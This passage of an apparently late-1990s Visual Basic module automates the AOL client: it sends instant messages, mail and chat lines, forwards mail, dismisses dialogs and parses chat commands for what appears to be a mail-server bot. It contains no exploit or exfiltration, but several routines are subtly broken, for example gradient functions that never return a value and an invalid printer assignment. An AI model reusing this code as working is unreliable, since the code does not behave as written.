        FullButton& = FindWindowEx(FullWindow&, 0&, "Button", "OK")
    Loop Until (FullWindow& <> 0& And FullButton& <> 0&) Or room$ = RoomTitle$
    DoEvents
    If FullWindow& <> 0& Then
        Do
            DoEvents
            Call SendMessage(FullButton&, WM_KEYDOWN, VK_SPACE, 0&)
            Call SendMessage(FullButton&, WM_KEYUP, VK_SPACE, 0&)
            Call SendMessage(FullButton&, WM_KEYDOWN, VK_SPACE, 0&)
            Call SendMessage(FullButton&, WM_KEYUP, VK_SPACE, 0&)
            FullWindow& = FindWindow("#32770", "America Online")
            FullButton& = FindWindowEx(FullWindow&, 0&, "Button", "OK")
        Loop Until FullWindow& = 0& And FullButton& = 0&
    End If
    DoEvents
End Sub
Public Sub StopMIDI(MIDIFile As String)
    Dim SafeFile As String
    SafeFile$ = dir(MIDIFile$)
    If SafeFile$ <> "" Then
        Call MciSendString("stop " & MIDIFile$, 0&, 0, 0)
    End If
End Sub
Public Sub WindowHide(hWnd As Long)
    Call ShowWindow(hWnd&, SW_HIDE)
End Sub

Public Sub WindowShow(hWnd As Long)
    Call ShowWindow(hWnd&, SW_SHOW)
End Sub
Public Sub Instantmessage(person As String, Message As String)
    Dim AOL As Long, MDI As Long, im As Long, Rich As Long
    Dim SendButton As Long, OK As Long, Button As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    Call XAOL4_Keyword("aol://9293:" & person$)
    Do
        DoEvents
        im& = FindWindowEx(MDI&, 0&, "AOL Child", "Send Instant Message")
        Rich& = FindWindowEx(im&, 0&, "RICHCNTL", vbNullString)
        SendButton& = FindWindowEx(im&, 0&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
    Loop Until im& <> 0& And Rich& <> 0& And SendButton& <> 0&
    Call SendMessageByString(Rich&, WM_SETTEXT, 0&, Message$)
    Call SendMessage(SendButton&, WM_LBUTTONDOWN, 0&, 0&)
    Call SendMessage(SendButton&, WM_LBUTTONUP, 0&, 0&)
    Do
        DoEvents
        OK& = FindWindow("#32770", "America Online")
        im& = FindWindowEx(MDI&, 0&, "AOL Child", "Send Instant Message")
    Loop Until OK& <> 0& Or im& = 0&
    If OK& <> 0& Then
        Button& = FindWindowEx(OK&, 0&, "Button", vbNullString)
        Call PostMessage(Button&, WM_KEYDOWN, VK_SPACE, 0&)
        Call PostMessage(Button&, WM_KEYUP, VK_SPACE, 0&)
        Call PostMessage(im&, WM_CLOSE, 0&, 0&)
    End If
End Sub
Public Function FileExists(sFileName As String) As Boolean
    If Len(sFileName$) = 0 Then
        FileExists = False
        Exit Function
    End If
    If Len(dir$(sFileName$)) Then
        FileExists = True
    Else
        FileExists = False
    End If
End Function
Public Sub icon(aIcon As Long)
    Call SendMessage(aIcon&, WM_LBUTTONDOWN, 0&, 0&)
    Call SendMessage(aIcon&, WM_LBUTTONUP, 0&, 0&)
End Sub
Public Sub ChatSend(Chat As String)
    Dim room As Long, AORich As Long, AORich2 As Long
    room& = FindRoom&
    AORich& = FindWindowEx(room, 0&, "RICHCNTL", vbNullString)
    AORich2& = FindWindowEx(room, AORich, "RICHCNTL", vbNullString)
    Call SendMessageByString(AORich2, WM_SETTEXT, 0&, Chat$)
    Call SendMessageLong(AORich2, WM_CHAR, ENTER_KEY, 0&)
End Sub
Public Sub SendMail(person As String, Subject As String, Message As String)
    Dim AOL As Long, MDI As Long, tool As Long, Toolbar As Long
    Dim ToolIcon As Long, OpenSend As Long, DoIt As Long
    Dim Rich As Long, EditTo As Long, EditCC As Long
    Dim EditSubject As Long, SendButton As Long
    Dim Combo As Long, fCombo As Long, ErrorWindow As Long
    Dim Button1 As Long, Button2 As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDICLIENT", vbNullString)
    tool& = FindWindowEx(AOL&, 0&, "AOL Toolbar", vbNullString)
    Toolbar& = FindWindowEx(tool&, 0&, "_AOL_Toolbar", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, 0&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    Call PostMessage(ToolIcon&, WM_LBUTTONDOWN, 0&, 0&)
    Call PostMessage(ToolIcon&, WM_LBUTTONUP, 0&, 0&)
    DoEvents
    Do
        DoEvents
        OpenSend& = FindWindowEx(MDI&, 0&, "AOL Child", "Write Mail")
        EditTo& = FindWindowEx(OpenSend&, 0&, "_AOL_Edit", vbNullString)
        EditCC& = FindWindowEx(OpenSend&, EditTo&, "_AOL_Edit", vbNullString)
        EditSubject& = FindWindowEx(OpenSend&, EditCC&, "_AOL_Edit", vbNullString)
        Rich& = FindWindowEx(OpenSend&, 0&, "RICHCNTL", vbNullString)
        Combo& = FindWindowEx(OpenSend&, 0&, "_AOL_Combobox", vbNullString)
        fCombo& = FindWindowEx(OpenSend&, 0&, "_AOL_Fontcombo", vbNullString)
        Button1& = FindWindowEx(OpenSend&, 0&, "_AOL_Icon", vbNullString)
        Button2& = FindWindowEx(OpenSend&, Button1&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(OpenSend&, 0&, "_AOL_Icon", vbNullString)
        For DoIt& = 1 To 13
            SendButton& = FindWindowEx(OpenSend&, SendButton&, "_AOL_Icon", vbNullString)
        Next DoIt&
    Loop Until OpenSend& <> 0& And EditTo& <> 0& And EditCC& <> 0& And EditSubject& <> 0& And Rich& <> 0& And SendButton& <> 0& And Combo& <> 0& And fCombo& <> 0& & SendButton& <> Button1& And SendButton& <> Button2&
    Call SendMessageByString(EditTo&, WM_SETTEXT, 0, person$)
    DoEvents
    Call SendMessageByString(EditSubject&, WM_SETTEXT, 0, Subject$)
    DoEvents
    Call SendMessageByString(Rich&, WM_SETTEXT, 0, Message$)
    DoEvents
    Pause 0.2
    Call SendMessage(SendButton&, WM_LBUTTONDOWN, 0&, 0&)
    Call SendMessage(SendButton&, WM_LBUTTONUP, 0&, 0&)
End Sub
Public Sub SetText(Window As Long, text)
    Call SendMessageByString(Window&, WM_SETTEXT, 0&, text)
End Sub
Public Sub FormOnTop(FormName As Form)
    Call SetWindowPos(FormName.hWnd, HWND_TOPMOST, 0&, 0&, 0&, 0&, flags)
End Sub

Public Sub FormNotOnTop(FormName As Form)
    Call SetWindowPos(FormName.hWnd, HWND_NOTOPMOST, 0&, 0&, 0&, 0&, flags)
End Sub
Public Sub FormExitDown(TheForm As Form)
    Do
        DoEvents
        TheForm.Top = Trim(Str(Int(TheForm.Top) + 300))
    Loop Until TheForm.Top > 7200
End Sub

Public Sub FormExitLeft(TheForm As Form)
    Do
        DoEvents
        TheForm.Left = Trim(Str(Int(TheForm.Left) - 300))
    Loop Until TheForm.Left < -TheForm.Width
End Sub

Public Sub FormExitRight(TheForm As Form)
    Do
        DoEvents
        TheForm.Left = Trim(Str(Int(TheForm.Left) + 300))
    Loop Until TheForm.Left > Screen.Width
End Sub

Public Sub FormExitUp(TheForm As Form)
    Do
        DoEvents
        TheForm.Top = Trim(Str(Int(TheForm.Top) - 300))
    Loop Until TheForm.Top < -TheForm.Width
End Sub

Sub scrollformdown(frm As Form)
'This will make the form slowly scroll down
'You can use a timeout to stop it and put it in a
'timer
frm.Height = Val(frm.Height) + 1150
End Sub
Sub scrollformup(frm As Form)
'This will make the form slowly scroll up
'You can use a timeout to stop it and put it in a
'timer
frm.Height = Val(frm.Height) - 1150
End Sub
Sub ScrollingCredits(lbl As label)
lbl.Height = Val(lbl.Height) + 10
End Sub
Sub closemodemport()
 Mscomm1.PortOpen = False
End Sub



Sub dial(Txt As String)
' Modem port must be open to dial
Mscomm1.Output = "ATDT " & Txt & vbCr
End Sub
Sub disconnectprinter()
Dim p As Object
For Each p In Printers
    If p.Port = "lpt1:" Or p.DeviceName Like "*laserjet*" Then
        Set Printer = p.Port = com1:
         
        Exit For
        
    End If
Next p
End Sub

Public Sub MailForward(SendTo As String, Message As String, DeleteFwd As Boolean)
    Dim AOL As Long, MDI As Long, Error As Long
    Dim OpenForward As Long, OpenSend As Long, SendButton As Long
    Dim DoIt As Long, EditTo As Long, EditCC As Long
    Dim EditSubject As Long, Rich As Long, fCombo As Long
    Dim Combo As Long, Button1 As Long, Button2 As Long
    Dim TempSubject As String
    OpenForward& = FindSendWindow
    If OpenForward& <> 0 Then
    SendButton& = FindWindowEx(OpenForward&, 0&, "_AOL_Icon", vbNullString)
    For DoIt& = 1 To 6
        SendButton& = FindWindowEx(OpenForward&, SendButton&, "_AOL_Icon", vbNullString)
    Next DoIt&
    Pause (0.3)
    Call Button(SendButton&)
    Do
        DoEvents
        OpenSend& = FindSendWindow
        EditTo& = FindWindowEx(OpenSend&, 0&, "_AOL_Edit", vbNullString)
        EditCC& = FindWindowEx(OpenSend&, EditTo&, "_AOL_Edit", vbNullString)
        EditSubject& = FindWindowEx(OpenSend&, EditCC&, "_AOL_Edit", vbNullString)
        Rich& = FindWindowEx(OpenSend&, 0&, "RICHCNTL", vbNullString)
        Combo& = FindWindowEx(OpenSend&, 0&, "_AOL_Combobox", vbNullString)
        fCombo& = FindWindowEx(OpenSend&, 0&, "_AOL_Fontcombo", vbNullString)
        Button1& = FindWindowEx(OpenSend&, 0&, "_AOL_Icon", vbNullString)
        Button2& = FindWindowEx(OpenSend&, Button1&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(OpenSend&, 0&, "_AOL_Icon", vbNullString)
        For DoIt& = 1 To 13
            SendButton& = FindWindowEx(OpenSend&, SendButton&, "_AOL_Icon", vbNullString)
        Next DoIt&
    Loop Until OpenSend& <> 0& And EditTo& <> 0& And EditCC& <> 0& And EditSubject& <> 0& And Rich& <> 0& And SendButton& <> 0& And Combo& <> 0& And fCombo& <> 0& & SendButton& <> Button1& And SendButton& <> Button2&
    If DeleteFwd = True Then
        TempSubject$ = GetText(EditSubject&)
        TempSubject$ = Right(TempSubject$, Len(TempSubject$) - 5)
        Call SendMessageByString(EditSubject&, WM_SETTEXT, 0, TempSubject$)
        DoEvents
    End If
    Call SendMessageByString(EditTo&, WM_SETTEXT, 0, SendTo$)
    DoEvents
    Call SendMessageByString(Rich&, WM_SETTEXT, 0, Message$)
    DoEvents
    Do Until OpenSend& = 0& Or Error& <> 0&
        DoEvents
        AOL& = FindWindow("AOL Frame25", vbNullString)
        MDI& = FindWindowEx(AOL&, 0&, "MDICLIENT", vbNullString)
        Error& = FindWindowEx(MDI&, 0&, "AOL Child", "Error")
        OpenSend& = FindSendWindow
        SendButton& = FindWindowEx(OpenSend&, 0&, "_AOL_Icon", vbNullString)
        For DoIt& = 1 To 11
            SendButton& = FindWindowEx(OpenSend&, SendButton&, "_AOL_Icon", vbNullString)
        Next DoIt&
        Call SendMessage(SendButton&, WM_LBUTTONDOWN, 0&, 0&)
        Call SendMessage(SendButton&, WM_LBUTTONUP, 0&, 0&)
        Pause 1
    Loop
    If OpenSend& = 0& Then Call PostMessage(OpenForward&, WM_CLOSE, 0&, 0&)
End If
End Sub

Public Function ReplaceString(MyString As String, ToFind As String, ReplaceWith As String) As String
    Dim Spot As Long, NewSpot As Long, LeftString As String
    Dim RightString As String, NewString As String
    Spot& = InStr(LCase(MyString$), LCase(ToFind))
    NewSpot& = Spot&
    Do
        If NewSpot& > 0& Then
            LeftString$ = Left(MyString$, NewSpot& - 1)
            If Spot& + Len(ToFind$) <= Len(MyString$) Then
                RightString$ = Right(MyString$, Len(MyString$) - NewSpot& - Len(ToFind$) + 1)
            Else
                RightString = ""
            End If
            NewString$ = LeftString$ & ReplaceWith$ & RightString$
            MyString$ = NewString$
        Else
            NewString$ = MyString$
        End If
        Spot& = NewSpot& + Len(ReplaceWith$)
        If Spot& > 0 Then
            NewSpot& = InStr(Spot&, LCase(MyString$), LCase(ToFind$))
        End If
    Loop Until NewSpot& < 1
    ReplaceString$ = NewString$
End Function
Function BoldBlueGreenBlue2(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
End Function
Function BoldBlueYellowBlue2(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
End Function

Sub AOL40_Mail_ClickForward()
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
Mail% = FindChildByTitle(MDI%, "")
Icon2% = FindChildByClass(Mail%, "_AOL_ICON")
Icon2% = GetWindow(Icon2%, GW_HWNDNEXT)
Icon2% = GetWindow(Icon2%, GW_HWNDNEXT)
Icon2% = GetWindow(Icon2%, GW_HWNDNEXT)
Icon2% = GetWindow(Icon2%, GW_HWNDNEXT)
Icon2% = GetWindow(Icon2%, GW_HWNDNEXT)
Icon2% = GetWindow(Icon2%, GW_HWNDNEXT)
Icon2% = GetWindow(Icon2%, GW_HWNDNEXT)
Icon2% = GetWindow(Icon2%, GW_HWNDNEXT)
ClickIcon (Icon2%)
TimeOut 2
aol2% = FindWindow("AOL Frame25", vbNullString)
mdi2% = FindChildByClass(aol2%, "MDIClient")
mail2% = FindChildByTitle(mdi2%, "Fwd: ")
If mail2% <> 0 Then Exit Sub
aol2% = FindWindow("AOL Frame25", vbNullString)
mdi2% = FindChildByClass(aol2%, "MDIClient")
mail2% = FindChildByTitle(mdi2%, "")
Icon2% = FindChildByClass(mail2%, "_AOL_ICON")
Icon2% = GetWindow(Icon2%, GW_HWNDNEXT)
Icon2% = GetWindow(Icon2%, GW_HWNDNEXT)
Icon2% = GetWindow(Icon2%, GW_HWNDNEXT)
Icon2% = GetWindow(Icon2%, GW_HWNDNEXT)
Icon2% = GetWindow(Icon2%, GW_HWNDNEXT)
Icon2% = GetWindow(Icon2%, GW_HWNDNEXT)
Icon2% = GetWindow(Icon2%, GW_HWNDNEXT)
Icon2% = GetWindow(Icon2%, GW_HWNDNEXT)
ClickIcon (Icon2%)
End Sub

Sub mail_minimize()
aol1 = FindWindow("AOL Frame25", vbNullString)
MDI1 = FindChildByClass(aol1, "MDIClient")
Mail11& = FindChildByTitle(MDI1, UserSN & "'s Online Mailbox")
    X = ShowWindow(Mail11&, SW_MINIMIZE)
    Pause (0.3)

End Sub
Sub mail_minimize2()
hWndAOL = FindWindow("AOL Frame25", vbNullString)
hWndAOLClient = FindChildByClass(hWndAOL, "MDIClient")
Mail11& = FindChildByTitle(hWndAOLClient, "Incoming/Saved Mail")
    X = ShowWindow(Mail11&, SW_MINIMIZE)
    Pause (0.3)
End Sub
Sub mail_restore()
aol1 = FindWindow("AOL Frame25", vbNullString)
MDI1 = FindChildByClass(aol1, "MDIClient")
Mail11& = FindChildByTitle(MDI1, UserSN & "'s Online Mailbox")
    X = ShowWindow(Mail11&, SW_RESTORE)
    Pause (0.3)

End Sub
Sub mail_restore2()
hWndAOL = FindWindow("AOL Frame25", vbNullString)
hWndAOLClient = FindChildByClass(hWndAOL, "MDIClient")
Mail11& = FindChildByTitle(hWndAOLClient, "Incoming/Saved Mail")
    X = ShowWindow(Mail11&, SW_RESTORE)
    Pause (0.3)
End Sub
Sub servergetvar()
thevar$ = Right(ChatText$, Len(ChatText$) - Len("/" & UserSN & " "))
thenum$ = Right(ChatText$, Len(ChatText$) - Len(LCase$("/" & UserSN & " send ")))
thefind$ = Right(ChatText$, Len(ChatText$) - Len(LCase$("/" & UserSN & " find ")))
TheList$ = Mid(ChatText$, Len(ChatText$) - Len(LCase$("/" & UserSN & " send list")))
End Sub
Function BoldBlackYellowBlack2(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Face=" + Chr(34) + "CosmicTwo" + Chr(34) + "><Font Color=#" & h & ">" & D
    Next b
    SendChat (Msg)
End Function
Function Wait4MailFlash()
'this waits until the user's mail window has stopped
'listing mail
mailwin% = GetTopWindow(AOLMDI())
AOLTree% = FindChildByClass(mailwin%, "_AOL_Tree")

Do: DoEvents
firstcount = SendMessage(AOLTree%, LB_GETCOUNT, 0, 0)
TimeOut (7)
secondcount = SendMessage(AOLTree%, LB_GETCOUNT, 0, 0)
If firstcount = secondcount Then Exit Do
Loop


End Function




Sub AOLSendChat(Chat)
room% = FindChatRoom
AORich% = FindChildByClass(room%, "RICHCNTL")
Call SetFocusAPI(room%)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)

Call SetFocusAPI(AORich%)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, Chat)
DoEvents
Call SendMessageByNum(AORich%, WM_CHAR, 13, 0)
End Sub
Sub AOLSendChat1(Chat)
room% = FindChatRoom
AORich% = FindChildByClass(room%, "RICHCNTL")
Call SetFocusAPI(room%)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)

Call SetFocusAPI(AORich%)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, Chat)
DoEvents
Call SendMessageByNum(AORich%, WM_CHAR, 13, 0)
End Sub
Sub AOLSendChat2(Chat)
room% = FindChatRoom
AORich% = FindChildByClass(room%, "RICHCNTL")
Call SetFocusAPI(room%)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)

Call SetFocusAPI(AORich%)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, Chat)
DoEvents
Call SendMessageByNum(AORich%, WM_CHAR, 13, 0)
End Sub
Sub AOLSendChat3(Chat)
room% = FindChatRoom
AORich% = FindChildByClass(room%, "RICHCNTL")
Call SetFocusAPI(room%)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)

Call SetFocusAPI(AORich%)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, Chat)
DoEvents
Call SendMessageByNum(AORich%, WM_CHAR, 13, 0)
End Sub
Sub AOLSendChat4(Chat)
room% = FindChatRoom
AORich% = FindChildByClass(room%, "RICHCNTL")
Call SetFocusAPI(room%)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)

Call SetFocusAPI(AORich%)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, Chat)
DoEvents
Call SendMessageByNum(AORich%, WM_CHAR, 13, 0)
End Sub
Sub AOLChatsend4(Chat)
room% = FindChatRoom
AORich% = FindChildByClass(room%, "RICHCNTL")
Call SetFocusAPI(room%)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)

Call SetFocusAPI(AORich%)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, Chat)
DoEvents
Call SendMessageByNum(AORich%, WM_CHAR, 13, 0)
End Sub
Sub AOLChatsend3(Chat)
room% = FindChatRoom
AORich% = FindChildByClass(room%, "RICHCNTL")
Call SetFocusAPI(room%)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)

Call SetFocusAPI(AORich%)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, Chat)
DoEvents
Call SendMessageByNum(AORich%, WM_CHAR, 13, 0)
End Sub
Sub AOLChatsend(Chat)
room% = FindChatRoom
AORich% = FindChildByClass(room%, "RICHCNTL")
Call SetFocusAPI(room%)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)

Call SetFocusAPI(AORich%)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, Chat)
DoEvents
Call SendMessageByNum(AORich%, WM_CHAR, 13, 0)
End Sub
Sub AOLChatsend1(Chat)
room% = FindChatRoom
AORich% = FindChildByClass(room%, "RICHCNTL")
Call SetFocusAPI(room%)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)

Call SetFocusAPI(AORich%)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, Chat)
DoEvents
Call SendMessageByNum(AORich%, WM_CHAR, 13, 0)
End Sub
Sub AOLChatsend2(Chat)
room% = FindChatRoom
AORich% = FindChildByClass(room%, "RICHCNTL")
Call SetFocusAPI(room%)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)

Call SetFocusAPI(AORich%)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, Chat)
DoEvents
Call SendMessageByNum(AORich%, WM_CHAR, 13, 0)
End Sub
Function AOLWin()
AOL% = FindWindow("AOL Frame25", vbNullString)
AOLWindow = AOL%
End Function
Sub AOL40_sendchat(Chat)
room% = FindChatRoom
AORich% = FindChildByClass(room%, "RICHCNTL")
Call SetFocusAPI(room%)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)

Call SetFocusAPI(AORich%)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, Chat)
DoEvents
Call SendMessageByNum(AORich%, WM_CHAR, 13, 0)
End Sub
Public Sub sendim(person As String, Message As String)
    Dim AOL As Long, MDI As Long, im As Long, Rich As Long
    Dim SendButton As Long, OK As Long, Button As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    Call XAOL4_Keyword("aol://9293:" & person$)
    Do
        DoEvents
        im& = FindWindowEx(MDI&, 0&, "AOL Child", "Send Instant Message")
        Rich& = FindWindowEx(im&, 0&, "RICHCNTL", vbNullString)
        SendButton& = FindWindowEx(im&, 0&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
    Loop Until im& <> 0& And Rich& <> 0& And SendButton& <> 0&
    Call SendMessageByString(Rich&, WM_SETTEXT, 0&, Message$)
    Call SendMessage(SendButton&, WM_LBUTTONDOWN, 0&, 0&)
    Call SendMessage(SendButton&, WM_LBUTTONUP, 0&, 0&)
    Do
        DoEvents
        OK& = FindWindow("#32770", "America Online")
        im& = FindWindowEx(MDI&, 0&, "AOL Child", "Send Instant Message")
    Loop Until OK& <> 0& Or im& = 0&
    If OK& <> 0& Then
        Button& = FindWindowEx(OK&, 0&, "Button", vbNullString)
        Call PostMessage(Button&, WM_KEYDOWN, VK_SPACE, 0&)
        Call PostMessage(Button&, WM_KEYUP, VK_SPACE, 0&)
        Call PostMessage(im&, WM_CLOSE, 0&, 0&)
    End If
End Sub
Public Sub IMsend(person As String, Message As String)
    Dim AOL As Long, MDI As Long, im As Long, Rich As Long
    Dim SendButton As Long, OK As Long, Button As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    Call XAOL4_Keyword("aol://9293:" & person$)
    Do
        DoEvents
        im& = FindWindowEx(MDI&, 0&, "AOL Child", "Send Instant Message")
        Rich& = FindWindowEx(im&, 0&, "RICHCNTL", vbNullString)
        SendButton& = FindWindowEx(im&, 0&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
    Loop Until im& <> 0& And Rich& <> 0& And SendButton& <> 0&
    Call SendMessageByString(Rich&, WM_SETTEXT, 0&, Message$)
    Call SendMessage(SendButton&, WM_LBUTTONDOWN, 0&, 0&)
    Call SendMessage(SendButton&, WM_LBUTTONUP, 0&, 0&)
    Do
        DoEvents
        OK& = FindWindow("#32770", "America Online")
        im& = FindWindowEx(MDI&, 0&, "AOL Child", "Send Instant Message")
    Loop Until OK& <> 0& Or im& = 0&
    If OK& <> 0& Then
        Button& = FindWindowEx(OK&, 0&, "Button", vbNullString)
        Call PostMessage(Button&, WM_KEYDOWN, VK_SPACE, 0&)
        Call PostMessage(Button&, WM_KEYUP, VK_SPACE, 0&)
        Call PostMessage(im&, WM_CLOSE, 0&, 0&)
    End If
End Sub
Sub AOLClickIcon(icon%)
Clck% = SendMessage(icon%, WM_LBUTTONDOWN, 0, 0&)
Clck% = SendMessage(icon%, WM_LBUTTONUP, 0, 0&)
End Sub
Sub closewin(Windo)
X = SendMessageByNum(Windo, WM_CLOSE, 0, 0)
End Sub
Sub setedit(win, Txt)
thetext% = SendMessageByString(win, WM_SETTEXT, 0, Txt)
End Sub
Function gettime()
gettime = Format$(Now, "h:mm:ss")
End Function
Sub sendtext(Chat)
room% = FindChatRoom
AORich% = FindChildByClass(room%, "RICHCNTL")
Call SetFocusAPI(room%)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)

Call SetFocusAPI(AORich%)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, Chat)
DoEvents
Call SendMessageByNum(AORich%, WM_CHAR, 13, 0)
End Sub



